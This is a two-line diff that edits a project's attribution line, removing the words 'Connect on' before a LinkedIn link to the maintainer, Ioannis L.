-Built and maintained by Ioannis L. Connect on [LinkedIn](https://www.linkedin.com/in/ioannis-l-074439194/).
+Built and maintained by Ioannis L. [LinkedIn](https://www.linkedin.com/in/ioannis-l-074439194/).
